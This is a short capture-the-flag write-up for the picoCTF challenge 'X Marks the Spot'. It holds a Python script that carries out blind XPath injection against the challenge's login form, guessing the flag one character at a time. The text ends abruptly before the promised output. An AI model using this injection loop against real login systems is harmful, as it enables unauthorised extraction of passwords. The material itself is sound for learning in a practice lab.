# X Marks the Spot

In this [video](https://www.youtube.com/watch?v=14eE7LSHlKc), explain how to make the code below and why it works. It is the same code in the video but with XPATH.

```python
import requests
import re

characters = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}'
print(characters)

username = "admin"

url = 'http://mercury.picoctf.net:7029/'

session = requests.Session()

seen_password = 'picoCTF{'

while(True):
  for ch in characters:
    print('Trying password: ', seen_password + ch)

    password = "' or //*[contains(., '" + seen_password + ch + "')] or '1'='2"
    response = session.post(url, data={ "name": username, "pass": password })

    content = response.text

    if "on the right path" in content:
      print('Yes!')
      seen_password = seen_password + ch
      break
```
After running this into a webshell, you will receive bits and pieces of the flag like shown below. (not sometimes there may be errors if you use Python 1):

